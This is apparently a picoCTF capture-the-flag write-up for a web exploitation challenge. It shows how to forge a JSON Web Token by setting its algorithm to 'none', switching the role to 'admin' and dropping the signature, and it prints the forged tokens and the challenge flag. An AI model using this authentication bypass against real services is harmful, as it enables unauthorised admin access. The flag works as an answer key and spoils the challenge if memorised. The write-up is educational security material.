# Overview 
Category: [Web Exploitation]()

AUTHOR: GEOFFREY NJOGU

# Description
Most web application developers use third party components without testing their security. Some of the past affected companies are:
Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638
Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used
VerticalScope (internet media company) - outdated version of vBulletin forum software used
Can you identify the components and exploit the vulnerable one?

# Solution
- When accessing the website with a demo account, we receive the token: 
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzIyMDkzMzM4NDY2LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjcuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzIyMDkzMzM4fQ.Ws43mo6X7Pp_RzBKBS8vqcRMLxapWPt2KGcAFl5z9Vw
```
- To find out what we have we can use the [JWT debugger website](https://token.dev/). By pasting in the above token value we get:

<img src="https://i.imgur.com/QfgVri7.png">

- This is now a direct walkthrough of what we need to do. First switch off security, by setting "alg" to "none", then set the role to "admin", and then omit the signature at the end but retain the trailing period.
  [Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)
- Results: 
<img src="https://i.imgur.com/QKXWGUb.png">

- This yields the base64 JWT:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzIyMDkzMzM4NDY2LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjcuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcyMjA5MzMzOH0
```
- The JWT should always have two (2) . separators.So, we just need to add a "." end of the sentence so it's still valid:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzIyMDkzMzM4NDY2LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjcuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcyMjA5MzMzOH0.
```
- Now change tokens and refresh again, we get the flag 
<img src="https://i.imgur.com/DiJnHsN.png">

> Flag :**picoCTF{succ3ss_@u7h3nt1c@710n_72bf8bd5}**